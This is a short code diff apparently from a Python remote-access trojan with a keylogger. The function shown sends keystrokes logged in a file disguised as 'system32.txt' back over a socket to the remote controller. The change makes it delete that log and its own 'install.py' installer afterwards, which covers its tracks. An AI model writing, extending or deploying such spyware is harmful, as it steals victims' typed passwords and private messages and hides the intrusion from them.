@@ -99,6 +99,7 @@ def receive_commands():
 
         elif data[:3].decode("utf-8") == "end":
             s.send(str.encode("loged so far:" + read_file("system32.txt") + "\n[-Key loger Stoped]" + str(os.getcwd()) + '>end'))
+            
             os.remove("system32.txt")
             os._exit(1)
 
@@ -115,7 +116,10 @@ def receive_commands():
             stop_key2()
             s.send(
             str.encode("loged so far:" + read_file("system32.txt") + "\n[-Key loger Stoped]" + str(os.getcwd()) + '>'))
-            os.remove("system32.txt")
+            if os.path.exists("system32.txt"):
+                os.remove("system32.txt")
+            if os.path.exists("install.py"):
+                os.remove("install.py")
 
         elif len(data) > 0:
             try:
